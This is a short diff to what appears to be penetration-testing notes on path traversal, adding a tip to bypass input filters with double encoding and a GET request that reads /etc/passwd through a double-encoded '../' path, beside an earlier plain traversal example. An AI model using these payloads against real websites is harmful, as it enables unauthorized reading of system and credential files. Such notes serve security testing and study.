@@ -2,6 +2,10 @@
 ## Example
 * assume website provides functionality to view files
 * if not properly sanitized input like ``../../../../../etc/passwd`` may be possible
+* try to bypass filters with double encoding. e.g.: 
+```
+GET /includes/img.php?path=..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd
+```
 
 ## Using phpfilter
 ```
